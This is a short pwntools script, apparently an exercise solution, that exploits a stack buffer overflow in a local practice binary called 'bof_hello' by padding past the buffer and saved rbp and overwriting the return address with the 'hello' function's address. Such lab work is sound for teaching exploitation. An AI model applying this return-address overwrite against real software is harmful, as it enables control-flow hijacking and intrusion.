from pwn import *

# set binary path
context.binary = "../build/bof_hello"
elf = context.binary

sh = process()

payload = b"a" * 0x10 # buf
payload += b"b" * 0x8 # saved rbp
payload += p64(elf.sym["hello"]) # return address
sh.sendline(payload)

sh.interactive()